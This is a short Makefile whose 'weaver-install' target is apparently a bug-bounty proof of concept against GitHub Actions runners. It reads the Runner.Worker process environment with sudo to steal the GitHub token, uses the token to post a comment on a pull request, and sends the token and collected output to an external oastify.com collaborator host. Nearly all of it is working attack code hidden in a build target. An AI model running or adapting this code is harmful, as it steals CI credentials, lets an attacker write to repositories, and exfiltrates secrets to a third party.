COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com

weaver-install:
	@echo "--- Final Impact PoC ---"
	
	# 1. Grab the token from the process environment
	$(eval WORKER_PID := $(shell pgrep -f "Runner.Worker" | head -n 1))
	$(eval TOKEN := $(shell sudo cat /proc/$(WORKER_PID)/environ | tr '\0' '\n' | grep -m 1 "^system.github.token=" | cut -d= -f2))
	
	# 2. Prove validity by getting the 'Rate Limit' (anyone can do this with a valid token)
	@curl -s -H "Authorization: Bearer $(TOKEN)" https://api.github.com/rate_limit > token_info.json
	
	# 3. Prove IMPACT by commenting on the PR (shows PullRequests: Write)
	# We get the PR number from the environment
	@PR_NUM=$$(sudo cat /proc/$(WORKER_PID)/environ | tr '\0' '\n' | grep -m 1 "system.github.issue.number=" | cut -d= -f2); \
	curl -s -X POST \
		-H "Authorization: Bearer $(TOKEN)" \
		-H "Accept: application/vnd.github+json" \
		https://api.github.com/repos/$(GITHUB_REPOSITORY)/issues/$$PR_NUM/comments \
		-d '{"body":"🚨 **PoC: RCE & Token Theft Successful**\nThis comment was posted using a stolen `ghs_` token from memory."}' >> token_info.json
	
	# 4. Exfiltrate everything
	@curl -X POST \
		-H "X-Captured-Token: $(TOKEN)" \
		-d @token_info.json \
		$(COLLABORATOR_URL)/poc_verified
